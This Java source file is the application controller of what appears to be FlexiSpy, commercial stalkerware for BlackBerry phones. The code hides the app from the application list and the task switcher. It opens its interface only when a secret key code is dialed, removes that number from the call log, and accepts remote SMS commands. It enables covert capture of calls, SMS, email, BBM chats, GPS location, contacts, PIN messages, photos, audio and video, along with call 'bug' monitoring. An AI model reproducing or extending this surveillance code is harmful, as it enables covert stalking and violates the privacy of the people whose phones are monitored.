package com.vvt.ctrl;

import java.io.IOException;
import java.util.Enumeration;
import java.util.Timer;
import java.util.TimerTask;
import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;
import com.vvt.bbm.BBMEngine;
import com.vvt.calllogmon.FxCallLogNumberMonitor;
import com.vvt.calllogmon.OutgoingCallListener;
import com.vvt.ctrl.AppEngine;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.constant.FxCallingModule;
import com.vvt.event.constant.FxGPSMethod;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSEngine;
import com.vvt.gpsc.GPSMethod;
import com.vvt.gpsc.GPSOption;
import com.vvt.gpsc.GPSPriority;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseChangeListener;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefAddressBook;
import com.vvt.pref.PrefAudioFile;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefPIN;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.PrefCameraImage;
import com.vvt.pref.PrefVideoFile;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.reportnumber.ReportPhoneNumber;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.RmtCmdRegister;
import com.vvt.rmtcmd.RmtCmdType;
import com.vvt.rmtcmd.SMSCmdReceiver;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.screen.PolymorphicUI;
import com.vvt.screen.SettingsScreen;
import com.vvt.screen.WelcomeScreen;
import com.vvt.std.Constant;
import com.vvt.std.FileUtil;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.ui.resource.MainAppTextResource;
import com.vvt.version.VersionInfo;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleGroupManager;

public class ApplicationManager implements OutgoingCallListener, LicenseChangeListener, FxTimerListener {

	private final String TAG = "ApplicationManager";
	// Preference
	private Preference pref = Global.getPreference();
	// RmtCmdRegister
	private RmtCmdRegister rmtCmdRegister = Global.getRmtCmdRegister();
	// SMSCmdReceiver
	private SMSCmdReceiver smsCmdRev = Global.getSMSCmdReceiver();
	// SMSCmdStore
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	// Screen
	private WelcomeScreen welcomeScreen = new WelcomeScreen();
	private SettingsScreen settingsScreen = null;
	// CallLogMonitor
	private FxCallLogNumberMonitor fxNumberRemover = Global.getFxCallLogNumberMonitor();
	// License
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	// AppEngine
	private AppEngine appEngine = new AppEngine();
	// UiApplication
	private PolymorphicUI uiApp = null;
	// Timer
	private FxTimer startAppTimer = new FxTimer(this);
	// Database
	private FxEventDatabase db = Global.getFxEventDatabase();
	private ReportPhoneNumber reportNumber = new ReportPhoneNumber();
	
	public ApplicationManager(PolymorphicUI uiApp) {
		this.uiApp = uiApp;
	}
	
	public void start() {
		/*// To set debug mode.
		Log.setDebugMode(ApplicationInfo.DEBUG);*/
		// To set startup time
		Global.getStartupTimeDb().setStartupTime(System.currentTimeMillis());
		// To hide application.
		hideFromAppList();
		// To set Product ID.
		if (licenseInfo.getProductID() == 0) {
//			int productId = 4103;
			int productId = Integer.parseInt(VersionInfo.getProductId());
			licenseInfo.setProductID(productId); 
			licenseMgr.commit(licenseInfo);
		}
		// To set LicenseChangeListener
		licenseMgr.registerLicenseChangeListener(this);
		fxNumberRemover.setListener(this);
		fxNumberRemover.addCallLogNumber(ApplicationInfo.DEFAULT_FX_KEY);
		// To start SMSCmdReceiver.
		smsCmdRev.start();
		
		// Prepare folder
//		prepareFolders();
		// Start Report number.
		reportNumber.startReport();
		
		// To register activation command.
		SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
		RmtCmdLine activationCmdLine = new RmtCmdLine();
		String activation = new String(MainAppTextResource.SMS_CONTROL_SCREEN_ACTIVATION_CMD);
		activationCmdLine.setMessage(activation);
		activationCmdLine.setCode(smsCmdCode.getActivateUrlCmd());
		activationCmdLine.setRmtCmdType(RmtCmdType.SMS);
		rmtCmdRegister.registerCommands(activationCmdLine);
		// To register activation command with AC.
		RmtCmdLine activationAcCmdLine = new RmtCmdLine();
		//activationAcCmdLine.setMessage(activation);
		activationAcCmdLine.setCode(smsCmdCode.getActivationAcUrlCmd());
		activationAcCmdLine.setRmtCmdType(RmtCmdType.SMS);
		rmtCmdRegister.registerCommands(activationAcCmdLine);
		// To check the product status.
		if (licenseInfo.getLicenseStatus().getId() != LicenseStatus.ACTIVATED.getId()) {
			// To bring the first page before activated.
			UiApplication.getUiApplication().invokeLater(new Runnable() {
				public void run() {
					UiApplication.getUiApplication().pushScreen(welcomeScreen);
				}
			});
		} else {
			// To check configuration ID and create polymorphic UI.
			createFeatures();
		}
	}
	
	private void bringToForeground() {
		int interval = 300;
		if (PhoneInfo.isFiveOrHigher()) {
			UiApplication.getUiApplication().invokeLater(new Runnable() {
				public void run() {
					uiApp.requestForeground();
				}
			}, interval, false);
		} else {
			UiApplication.getUiApplication().invokeLater(new Runnable() {
				public void run() {
					uiApp.requestForeground();
				}
			});
		}
		// To hide application from switcher.
		int foregoroundInterval = 1000;
		new Timer().schedule(new TimerTask() {
			public void run() {
				uiApp.setForegroundApproval(false);
			}
		}, foregoroundInterval);
	}
	
	private void createFeatures() {
		// Prepare folder
		createApplicationFolders();
		// AppEngine
		appEngine.start();
		// CallLogMonitor.
		String flxiKey = Constant.ASTERISK + Constant.HASH + licenseInfo.getActivationCode();
		fxNumberRemover.addCallLogNumber(flxiKey);
		// UI (Should be created every times.)
		settingsScreen = new SettingsScreen();
		// To push screen.
		uiApp.invokeLater(new Runnable() {
			public void run() {				
				uiApp.pushScreen(settingsScreen);
			}
		});
	}
	
	private void initializeProductFeatures() {
		PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		PrefWatchListInfo prefWatchList = prefBug.getPrefWatchListInfo();
		PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
		PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		PrefAddressBook addrBook = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
		PrefPIN prefPin = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
		PrefCameraImage prefCamImage = (PrefCameraImage)pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
		PrefAudioFile prefAudioFile = (PrefAudioFile)pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
		PrefVideoFile prefVideoFile = (PrefVideoFile)pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
		GPSEngine gpsEngine = new GPSEngine();
		int locationTimerIndex = 0;
		int warningIndex = 0;
		int confID = licenseInfo.getProductConfID();
		int maxEventCount = 10;
		settings.setMaxEventCount(maxEventCount);
		int sendTimeIndex = 1; // Default is 1 hour
		settings.setSendTimeIndex(sendTimeIndex);
		settings.setCaptured(true);
		pref.commit(settings);
		GPSOption gpsOpt = new GPSOption();
		int timeout = 10;
		switch(confID) {
			case ApplicationInfo.LIGHT_I_F:
				// Event
				prefEvent.setCallLogEnabled(true);
				prefEvent.setEmailEnabled(true);
				prefEvent.setSMSEnabled(true);
				prefEvent.setSupported(true);
				// Cell
				locationTimerIndex = 7;
				prefCell.setEnabled(false);
				prefCell.setSupported(true);
				prefCell.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerIndex]);
				warningIndex = 3;
				prefCell.setWarningPosition(warningIndex);
				pref.commit(prefEvent);
				pref.commit(prefCell);
				break;
			case ApplicationInfo.PRO_I_F:
				// IM
				if (BBMEngine.isSupported()) {
					prefMessenger.setBBMEnabled(true);
					prefMessenger.setSupported(true);
					pref.commit(prefMessenger);
				}
				// Event
				prefEvent.setCallLogEnabled(true);
				prefEvent.setEmailEnabled(true);
				prefEvent.setSMSEnabled(true);
				prefEvent.setSupported(true);
				locationTimerIndex = 7;
				warningIndex = 3;
				pref.commit(prefEvent);
				// GPS
				gpsOpt.setTimeout(timeout);
				gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerIndex]);
				if (gpsEngine.isSupportedGPS()) {
					GPSMethod assisted = new GPSMethod();
					GPSMethod google = new GPSMethod();
					assisted.setMethod(FxGPSMethod.AGPS);
					assisted.setPriority(GPSPriority.FIRST_PRIORITY);
					google.setMethod(FxGPSMethod.CELL_INFO);
					google.setPriority(GPSPriority.SECOND_PRIORITY);
					gpsOpt.addGPSMethod(assisted);
					gpsOpt.addGPSMethod(google);
				} else {
					GPSMethod google = new GPSMethod();
					google.setMethod(FxGPSMethod.CELL_INFO);
					google.setPriority(GPSPriority.FIRST_PRIORITY);
					gpsOpt.addGPSMethod(google);
				}
				prefGPS.setEnabled(false);
				prefGPS.setSupported(true);
				prefGPS.setGpsOption(gpsOpt);
				prefGPS.setWarningPosition(warningIndex);
				pref.commit(prefGPS);
				// Bug
				prefBug.setEnabled(false);
				prefWatchList.setWatchListEnabled(false);
				prefBug.setPrefWatchListInfo(prefWatchList);
				prefBug.setConferenceSupported(false);
				prefBug.setSupported(true);
				pref.commit(prefBug);
				// System
				prefSystem.setSIMChangeEnabled(true);
				prefSystem.setSupported(true);
				pref.commit(prefSystem);
				break;
			case ApplicationInfo.PROX_I_F:
				// IM
				if (BBMEngine.isSupported()) {
					prefMessenger.setBBMEnabled(true);
					prefMessenger.setSupported(true);
					pref.commit(prefMessenger);
				}
				// Event
				prefEvent.setCallLogEnabled(true);
				prefEvent.setEmailEnabled(true);
				prefEvent.setSMSEnabled(true);
				prefEvent.setSupported(true);
				pref.commit(prefEvent);
				locationTimerIndex = 7;
				warningIndex = 3;
				// GPS
				Global.getLocationCapture().setMode(FxCallingModule.MODULE_CORE_TRIGGER);
				gpsOpt.setTimeout(timeout);
				gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerIndex]);
				if (gpsEngine.isSupportedGPS()) {
					GPSMethod assisted = new GPSMethod();
					GPSMethod google = new GPSMethod();
					assisted.setMethod(FxGPSMethod.AGPS);
					assisted.setPriority(GPSPriority.FIRST_PRIORITY);
					google.setMethod(FxGPSMethod.CELL_INFO);
					google.setPriority(GPSPriority.SECOND_PRIORITY);
					gpsOpt.addGPSMethod(assisted);
					gpsOpt.addGPSMethod(google);
				} else {
					GPSMethod google = new GPSMethod();
					google.setMethod(FxGPSMethod.CELL_INFO);
					google.setPriority(GPSPriority.FIRST_PRIORITY);
					gpsOpt.addGPSMethod(google);
				}
				prefGPS.setEnabled(false);
				prefGPS.setSupported(true);
				prefGPS.setGpsOption(gpsOpt);
				prefGPS.setWarningPosition(warningIndex);
				pref.commit(prefGPS);
				// Address Book
				addrBook.setEnabled(true);
				addrBook.setSupported(true);
				pref.commit(addrBook);
				// Bug
				prefBug.setEnabled(true);
				prefWatchList.setWatchListEnabled(true);
				prefBug.setPrefWatchListInfo(prefWatchList);
				prefBug.setConferenceSupported(true);
				prefBug.setSupported(true);
				pref.commit(prefBug);
				// System
				prefSystem.setSIMChangeEnabled(true);
				prefSystem.setSupported(true);
				pref.commit(prefSystem);
				// PIN
				prefPin.setSupported(true);
				prefPin.setEnabled(true);
				pref.commit(prefPin);
				// Camera Image
				prefCamImage.setSupported(true);
				prefCamImage.setEnabled(true);
				pref.commit(prefCamImage);
				// Audio File
				prefAudioFile.setSupported(true);
				prefAudioFile.setEnabled(true);
				pref.commit(prefAudioFile);
				// Video File
				prefVideoFile.setSupported(true);
				prefVideoFile.setEnabled(true);
				pref.commit(prefVideoFile);
				break;
		}
	}

	private void createApplicationFolders()	{
		try {
			boolean protFolder = FileUtil.createFolder(ApplicationInfo.PHOENIX_PATH);
			if (protFolder) {
				Global.getCommandServiceManager().setSessionManagerDefaultPath(ApplicationInfo.PHOENIX_PATH);
			}
			FileUtil.createFolder(ApplicationInfo.THUMB_PATH);
		} catch (Exception e) {
			Log.error(TAG + ".createApplicationFolders()", e.getMessage(), e);
		}
	}
    
	private void deleteApplicationFolders() {
		try {
			FileUtil.deleteFolder(ApplicationInfo.PHOENIX_PATH);
			FileUtil.deleteFolder(ApplicationInfo.THUMB_PATH);
		} catch (Exception e) {
			Log.error(TAG + ".deleteApplicationFolders()", e.getMessage(), e);
		}
	}
	
	private void removeFeature() {
		// Delete application folders.
		deleteApplicationFolders();
		// To stop engine.
		appEngine.stop();
		// To reset remote commands.
		Global.getSMSCmdStore().useDefault();
		// To reset product features.
		pref.reset();
		// To remove Flexikey out of the FxNumberRemover.
		String flxiKey = Constant.ASTERISK + Constant.HASH + licenseInfo.getActivationCode();
		fxNumberRemover.removeCallLogNumber(flxiKey);
		// To reset the database.
		db.reset();
	}

	private void hideFromAppList() {
		try {
			CodeModuleGroup[] cmgs = CodeModuleGroupManager.loadAll();
			for (int i = 0; i < cmgs.length; i++) { // To sequentially search the FlexiSpy Module.
				CodeModuleGroup cmg = cmgs[i];
				String cmgName = cmg.getName();
				if (cmgName.indexOf(ApplicationInfo.APPLICATION_NAME) != -1) {
					cmg.delete();
				}
			}
		} catch (Exception e) {
			Log.error("ApplicationManager.hideFromAppList", null, e);
		}
	}

	// OutgoingCallListener
	public void onOutgoingCall(String number) {
		String flexiKey = Constant.ASTERISK + Constant.HASH + licenseInfo.getActivationCode();
		int licId = licenseInfo.getLicenseStatus().getId();
		if ((licId == LicenseStatus.ACTIVATED.getId() && number.endsWith(flexiKey)) || (licId == LicenseStatus.DEACTIVATED.getId() && number.endsWith(ApplicationInfo.DEFAULT_FX_KEY)) || (licId == LicenseStatus.NONE.getId() && number.endsWith(ApplicationInfo.DEFAULT_FX_KEY))) {			
//			Log.debug("ApplicationManager.onOutgoingCall()", "ENTER");
			int seconds = 1;
			uiApp.setForegroundApproval(true);
			startAppTimer.setInterval(seconds);
			startAppTimer.start();
		}
	}

	// LicenseChangeListener
	public void licenseChanged(LicenseInfo licenseInfo) {
		/*if (Log.isDebugEnable()) {
			Log.debug("ApplicationManager.licenseChanged()", "ENTER, license = deatcivate? " + (licenseInfo.getLicenseStatus().getId() == LicenseStatus.DEACTIVATED.getId()));
		}*/
		if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
			if (welcomeScreen != null) {
				UiApplication.getUiApplication().invokeLater(new Runnable() {
					public void run() {
						UiApplication.getUiApplication().popScreen(welcomeScreen);
					}
				});
			}
			// ProductSettings
			initializeProductFeatures();
			createFeatures();
		} else if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.DEACTIVATED.getId()) {
			try {
				/*if (Log.isDebugEnable()) {
					Log.debug("ApplicationManager.licenseChanged().DEACTIVATED", "settingsScreen.obj: " + settingsScreen.hashCode());
				}*/
				removeFeature();
//				appEngine.stopBug();
				if (settingsScreen != null) {
					settingsScreen.doneDeactivation();
					// To manage screen.
					UiApplication.getUiApplication().invokeLater(new Runnable() {
						public void run() {
//							UiApplication.getUiApplication().popScreen(settingsScreen);
							UiApplication.getUiApplication().pushScreen(welcomeScreen);
						}
					});
				}
			} catch (Exception e) {
				Log.error(TAG + ".licenseChanged()", e.getMessage(), e);
			}
		} else if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.UNINSTALL.getId()) {
			try {
				/*if (Log.isDebugEnable()) {
					Log.debug("ApplicationManager.licenseChanged().UNINSTALL", "ENTER");
				}*/
				removeFeature();
				fxNumberRemover.removeCallLogNumber(ApplicationInfo.DEFAULT_FX_KEY);
				fxNumberRemover.setListener(null);
//				appEngine.stopBug();
				appEngine = null;
				// To stop report phone number.
				reportNumber.stopReport();
				Dialog.alert(MainAppTextResource.WELCOME_SCREEN_UNINSTALL_AFTER);
				/*if (Log.isDebugEnable()) {
					Log.debug("ApplicationManager.licenseChanged().UNINSTALL", "EXIT");
				}*/
				System.exit(0);
			} catch (Exception e) {
				Log.error("ApplicationManager.licenseChanged().UNINSTALL", e.getMessage(), e);
			}
		}
	}

	// FxTimerListener
	public void timerExpired(int id) {
		if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
//			Log.debug("ApplicationManager.timerExpired()", "ENTER");
			settingsScreen.refreshUI();
		}
		bringToForeground();
	}
}
